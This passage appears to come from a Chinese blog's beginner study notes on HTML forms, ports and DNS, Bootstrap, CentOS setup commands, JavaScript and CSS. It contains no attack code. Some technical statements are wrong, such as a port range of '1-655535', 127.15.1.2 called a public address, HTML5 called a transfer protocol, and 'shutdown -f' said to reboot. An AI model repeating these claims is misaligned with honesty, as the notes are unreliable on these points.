id&#x3D;”male” name&#x3D;”gender” value&#x3D;”male” checked: 创建了一个单选按钮，类型为单选，ID 为 male，名称为 gender，值为 male，并且这个按钮默认被选中。label for&#x3D;”male”男&#x2F;label: 创建了一个标签，用于描述上面的单选按钮。input type&#x3D;”radio” id&#x3D;”female” name&#x3D;”gender” value&#x3D;”female”: 创建了另一个单选按钮，具体属性同上。label for&#x3D;”female”女&#x2F;label：描述第二个单选按钮。input type&#x3D;”checkbox” id&#x3D;”subscribe” name&#x3D;”subscribe” checked: 创建了一个复选框，类型为复选框，ID 为 subscribe，名称为 subscribe，且默认被选中。label for&#x3D;”subscribe”订阅推送信息&#x2F;label: 创建了一个标签，用于描述上面的复选框。<br>name值一样就是单选，不一样就是多选， checked表示默认选项。<br>这行代码label for&#x3D;”country”国家:&#x2F;label: 创建了一个标签用于描述下拉列表选择的相关说明。select id&#x3D;”country” name&#x3D;”country”: 开始创建一个下拉列表，ID 为 country，名称为 country。option value&#x3D;”cn”CN&#x2F;option: 创建了一个选项，值为 cn，显示为 CN。option value&#x3D;”usa”USA&#x2F;option: 创建了第二个选项，值为 usa，显示为 USA。option value&#x3D;”uk”UK&#x2F;option: 创建了第三个选项，值为 uk，显示为 UK。&#x2F;select: 结束下拉列表。input type&#x3D;”submit” value&#x3D;”提交”: 创建了一个提交按钮，类型为提交，显示的文本为“提交”。基本上form表单就介绍了这么多，老师每一步都讲的很详细。</p><h2 id="网页介绍"><a href="#网页介绍" class="headerlink" title="网页介绍"></a>网页介绍</h2><p>端口：1-655535<br>常见协议名对应的端口号<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200928670.png" alt="image-20231210200928670"><br>请求介绍：<a href="http://baidu.com/">http://baidu.com</a>                            get<br>协议名：&#x2F;&#x2F;目标IP：端口&#x2F;请求资源路径？参数&#x3D;值；参数&#x3D;值，两个参数通过get的方法进行获取<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200954419.png" alt="image-20231210200954419"><br>dns：域名解析服务：将域名解析为IP地址<br>全球有13个dns根服务器<br>pc请求域名的优先级从hosts到根dns是越来越低的，下图是pc请求的一个示意图，优先hosts主机。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210201013263.png" alt="image-20231210201013263"></p><h2 id="bootstrap5教程"><a href="#bootstrap5教程" class="headerlink" title="bootstrap5教程"></a>bootstrap5教程</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701956416503-42cb389e-1f3a-42b9-9b39-b83184523c08.png" alt="5e22456c4f07fd4265c8ee88d026411.png"><br>使用 Bootstrap 5 可以轻松构建响应式、移动设备优先的网站和应用程序。<br>引入 Bootstrap 样式表和 JavaScript 文件：<br>在 HTML 文档的 head 部分引入以下代码来加载 Bootstrap 5 的样式表和 JavaScript 文件，就如上图所示。而且在 HTML 中使用 Bootstrap 5 的各种组件、布局和样式来构建网站或应用程序。例如，可以使用容器、栅格系统、按钮、表单、导航栏等组件。总之是一个很不错的工具，不过使用的人越来越少了。</p><h2 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a>web安全</h2><p>web安全<br>c语言的演变：c  c++ c#<br>汇编  c  c++ c#  java python<br>         go             php：只能做网站<br>具体如图所示：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210201030659.png" alt="image-20231210201030659"><br>下午自己制作了一个网页，感觉效果不是很好。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>湖南人民政府<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">nav</span> &#123;<span class="attribute">background-color</span>: <span class="number">#006EAB</span>;<span class="attribute">padding</span>: <span class="number">10px</span>;<span class="attribute">text-align</span>: center;&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">ul</span> &#123;<span class="attribute">list-style-type</span>: none;<span class="attribute">margin</span>: <span class="number">0</span>;<span class="attribute">padding</span>: <span class="number">0</span>;<span class="attribute">margin-bottom</span>:auto;<span class="attribute">padding-bottom</span>:auto;&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">li</span> &#123;<span class="attribute">display</span>: inline;<span class="attribute">margin-right</span>: <span class="number">10px</span>;&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">a</span> &#123;<span class="attribute">text-decoration</span>: none;<span class="attribute">color</span>: <span class="number">#fff</span>;<span class="attribute">padding</span>: <span class="number">5px</span>;&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;<span class="attribute">background-color</span>: <span class="number">#d7e9f7</span>;&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.sy_news</span>&#123;<span class="attribute">background-color</span>:<span class="number">#999999</span>;<span class="attribute">text-align</span>: center;<span class="attribute">margin-bottom</span>: <span class="number">0</span>;<span class="attribute">width</span>: <span class="number">2000px</span>;&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.sy_toutiao</span>&#123;<span class="attribute">margin-bottom</span>: <span class="number">0</span>;&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;class=m-head&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>中国政府网<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>湖南省人大网<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>湖南省政协网<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                 <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;C:\Users\林尘曦\Desktop\html\欢迎光临湖南省人民政府门户网站_files\logo.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;logo&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;m-end&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>省政府<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>政务要闻<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>政务公开<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>一件事一次办<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>互动交流<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>政务数据<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>锦绣潇湘<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sy_toutiao&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display:block;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1200px&quot;</span>;<span class="attr">height</span>=<span class="string">&quot;200px&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;C:\Users\林尘曦\Desktop\html\欢迎光临湖南省人民政府门户网站_files\sy_zl2.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;sy_zl2.jpg&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sy_news&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">div</span> &gt;</span>植根人民 造福人民——习近平同志倡导践行“四下基层”闪耀时代光彩<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">div</span> &gt;</span>“把心贴近人民”——解码“四下基层”|传承弘扬“四下基层”优良作风|用好“四下基层”这个重要抓手<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>   </span><br></pre></td></tr></table></figure><p>由于代码太长没法展示看下效果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701957107538-e5ad448e-7457-4f3f-853f-f7f8d4e8c5ac.png" alt="53c112f0435497f7303c2e18b6a7386.png"></p>]]></content>
      
      
      <categories>
          
          <category> php动态网站的实现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> form表单,网页介绍,bootstrap5教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复习网络基础,学习html,介绍css和js</title>
      <link href="/2023/12/06/%E5%A4%8D%E4%B9%A0%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80-%E5%AD%A6%E4%B9%A0html-%E4%BB%8B%E7%BB%8Dcss%E5%92%8Cjs/"/>
      <url>/2023/12/06/%E5%A4%8D%E4%B9%A0%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80-%E5%AD%A6%E4%B9%A0html-%E4%BB%8B%E7%BB%8Dcss%E5%92%8Cjs/</url>
      
        <content type="html"><![CDATA[<p> 上午：</p><h2 id="复习"><a href="#复习" class="headerlink" title="复习"></a>复习</h2><p>   复习昨天学习的osi七层网络模型：物理层，数据链路层，网络层，传输层，会话层，表示层，应用层。<br>    判断ip的类型：；例如127.15.1.2是公网地址，127.0.0.1是本地回环地址，0.0.0.0  *是任意IP地址。<br>    centos-minnmal复习:ls cp find whoami cat grep touch   mkdir rm pwd rm  ip add chomd等命令的复习，这里就不详细说明了，有需要请查看第一周笔记第三天centos-minimal虚拟机命令。<br>    find &#x2F;iname ‘test?’, ‘?’表示匹配文件名称中的一个字符(不包括路径)<br>    ping baidu.com -c 3 -c 3表示ping三次后停止。</p><h2 id="bash脚本环境安装"><a href="#bash脚本环境安装" class="headerlink" title="bash脚本环境安装"></a>bash脚本环境安装</h2><p>ssh连接的复习，当连接成功之后输入以下命令安装bash脚本的一些基本的环境，一个个输入以便能够更好的执行<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701861138128-d546e661-3c2b-4d62-a55b-494b30a23a1a.png" alt="image.png"><br>以下是对该命令详细的介绍与解释：<br>yum install net-tools.x86_64 -y 安装网络命令<br>yum -y install epel-release   安装软件源<br>yum -y install vim    安装编辑器<br>yum install unzip -y  安装unzip工具<br>yum install -y git    安装Git版本控制工具<br>yum install docker -y  安装容器引擎<br>yum -y install python-pip 安装python的pip包管理工具<br>yum install -y docker-compose 安装用于定义和运行多个容器的工具<br>yum search wget -y(yum install wget)    搜索并安装wget工具，在这里用的是install，因为search在本次安装过程中会报错，提示要用serach all 可惜的是还是会报错<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701861564678-7a3fa226-66d0-40f7-9c49-2b60164d2cb9.png" alt="image.png"><br>所以这里应用yum install wget去安装wget<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701861659041-5849dd3f-f684-40d8-a20f-cb5af59a6ae5.png" alt="image.png"><br>安装完成之后输入： rpm -qa|grep “wget”显示wget的版本号就算安装成功。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701861728152-26da0636-6d36-43fc-aeeb-2dad7829c96a.png" alt="image.png"><br>关机命令的学习：<br>shutdown -c ：取消前一个关机命令<br>shutdown -h ：关机<br>shutdown -f  ：重启<br>reboot：重启命令<br>init 6：重启命令<br>关机比较耗时间这里就不截图展示了。</p><p>下午：</p><h2 id="介绍HTML5"><a href="#介绍HTML5" class="headerlink" title="介绍HTML5"></a>介绍HTML5</h2><p>HTML5：超文本传输协议5<br>认识html的组成以及基本框架，主要是用vscode进行编写html代码，新建1.txt修改后缀名为1.html，用cscode打开，之后安装两个插件ColorHight和HTML  CSS Support，这两个插件安装完成之后，输入！按下table会出现如下结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701863015804-49485455-bf78-4862-895d-a67408ffb460.png" alt="image.png"><br>       en代表的是英文，meta标签包含UTF-8是代码编码格式以及关键词，网页中的 title 元素：在 HTML 页面中，title元素用于定义网页的标题。它通常位于 head标签内部，并显示在浏览器标签栏或窗口标题栏中。网页的标题可以帮助用户识别页面内容，并在收藏夹或搜索引擎结果中显示。</p><p>​      head元素是表示文档头部的标签。它位于 html 标签内部，紧跟在 title 元素之前，用于定义有关页面的元数据和其他配置信息，而不是直接显示在页面内容中。</p><p>​      body元素是表示页面内容区域的标签。它位于 html标签内部，在 head元素之后，用于定义和包含实际显示在浏览器中的网页内容。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> b,trong：加粗</span><br><span class="line">sup:上标</span><br><span class="line">sub:下标</span><br><span class="line">i,em：斜体</span><br><span class="line">注释：ctrl+/</span><br><span class="line">h1:一号标题</span><br><span class="line">h6：六号标题</span><br><span class="line">br/ ：换行，不显示</span><br><span class="line">hr / :水平线</span><br><span class="line">s：文字中下方有横线穿过</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;地址&quot;</span>&gt;</span>汉字<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;路径&quot;</span> <span class="attr">width</span>=<span class="string">&quot;宽度&quot;</span> <span class="attr">height</span>=<span class="string">&quot;高度&quot;</span> /&gt;</span></span><br><span class="line">del:只用于表示文本的删除</span><br><span class="line">p：文本库</span><br></pre></td></tr></table></figure><p>输入代码的结果为：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701864410277-b8f3abce-a8de-4805-a3e5-f7a3ed9d57aa.png" alt="image.png"><br>效果为：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701864446505-fb74481b-5faa-47fe-a0bd-bc45c34da145.png" alt="image.png"><br>为了更加方便的书写代码，分享了几个好用的chatgpt资源：<br>文心一言地址：<a href="https://yiyan.baidu.com/">https://yiyan.baidu.com/</a><br>阿水AI：<a href="https://ai.xiabb.chat/auth/register?inviteCode=528FVXP861">https://ai.xiabb.chat/auth/register?inviteCode=528FVXP861</a><br>chat8：<a href="https://guan.chat772.com/#/register?bronk_on=1719312">https://guan.chat772.com/#/register?bronk_on&#x3D;1719312</a><br>因为前端代码chatgpt大部分都能直接写，拿来用即可</p><h2 id="介绍js"><a href="#介绍js" class="headerlink" title="介绍js"></a>介绍js</h2><p>​         JS是JavaScript的缩写，是一种用于网页开发的交互式脚本编程语言。它是一种轻量级的、解释性的语言，常用于为网页添加动态功能和交互性。JavaScript可以被嵌入到HTML页面中，在用户与网页交互时触发各种操作和事件，从而实现动态效果，比如表单验证、网页内容的动态加载和更新等。它还可以用于开发服务器端的应用程序和桌面应用程序。由于其广泛应用和与HTML、CSS的协作，JavaScript已经成为web开发中最重要的三大技术之一。</p><p>其中老师介绍了一个视频js<br>代码为：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">id</span>=<span class="string">&quot;myVideo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">id</span>=<span class="string">&quot;mp4_src&quot;</span> <span class="attr">src</span>=<span class="string">&quot;mov_bbb.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">id</span>=<span class="string">&quot;ogg_src&quot;</span>  <span class="attr">src</span>=<span class="string">&quot;mov_bbb.ogg&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/ogg&quot;</span>&gt;</span></span><br><span class="line">  您的浏览器不支持 video 标签。</span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>点击按钮播放或暂停视频。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;playVid()&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span>播放视频<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;pauseVid()&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span>暂停视频<span class="tag">&lt;/<span class="name">button</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myVideo&quot;</span>); </span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">playVid</span>(<span class="params"></span>)&#123; </span></span><br><span class="line"><span class="language-javascript">x.<span class="title function_">play</span>(); </span></span><br><span class="line"><span class="language-javascript">&#125; </span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">pauseVid</span>(<span class="params"></span>)&#123; </span></span><br><span class="line"><span class="language-javascript">x.<span class="title function_">pause</span>(); </span></span><br><span class="line"><span class="language-javascript">&#125; </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>视频由<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.bigbuckbunny.org/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>Big Buck Bunny<span class="tag">&lt;/<span class="name">a</span>&gt;</span>提供。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于找不到老师介绍的原视频只能找个差不多的来代替。介绍一下这是一个 HTML 页面代码，其中包含一个视频播放功能。通过点击按钮，可以播放或暂停视频。视频元素的 id 是 “myVideo”，通过 JavaScript 代码获取该元素对象。有两个按钮，分别调用了两个 JavaScript 函数：playVid() 和 pauseVid()。其中，playVid() 函数调用了元素对象的 play() 方法来播放视频，pauseVid() 函数则调用了元素对象的 pause() 方法来暂停视频。<br>视频源有两个(“source” 元素)，分别是 “mov_bbb.mp4” 和 “mov_bbb.ogg”，对应 MP4 和 OGG 格式的视频文件。<br>最后，页面中还提供了一个链接，点击链接可以访问 Big Buck Bunny 的网站。</p><h2 id="介绍css简单的页面布局"><a href="#介绍css简单的页面布局" class="headerlink" title="介绍css简单的页面布局"></a>介绍css简单的页面布局</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>: lightgrey;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: <span class="number">25px</span> solid green;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>盒子模型演示<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>CSS盒模型本质上是一个盒子，封装周围的HTML元素，它包括：边距，边框，填充，和实际内容。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>这里是盒子内的实际内容。有 25px 内间距，25px 外间距、25px 绿色边框。<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701866139340-02a567e0-94ea-4601-ad76-f5b0a53e1bd4.png" alt="image.png"><br>结果展示如上图，这是一个简单的div盒子的布局，加上style标签能够更好的布局。css的盒子布局还可以看成这个样式：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200844955.png" alt="image-20231210200844955"><br>所以总结以下：html5进行整体内容的编写，css进行整个页面的布局，js进行事件的交互，所谓事件的交互就是指通过代码来处理和响应用户与网页之间的交互操作，例如鼠标点击、键盘输入、页面滚动等。举例说明以下：点击播放的按钮视频或者音频能够播放是因为触动了事件发生的条件也就是所谓的产生了事件的交互。<br>最后安装老师教的内容自己造了一个盒子，代码如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">500px</span>; </span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">100px</span>;  </span></span><br><span class="line"><span class="language-css">        <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>:<span class="built_in">rgb</span>(<span class="number">109</span>, <span class="number">241</span>, <span class="number">179</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin-bottom</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-id">#tf</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>:<span class="built_in">rgb</span>(<span class="number">205</span>, <span class="number">134</span>, <span class="number">41</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin-bottom</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span 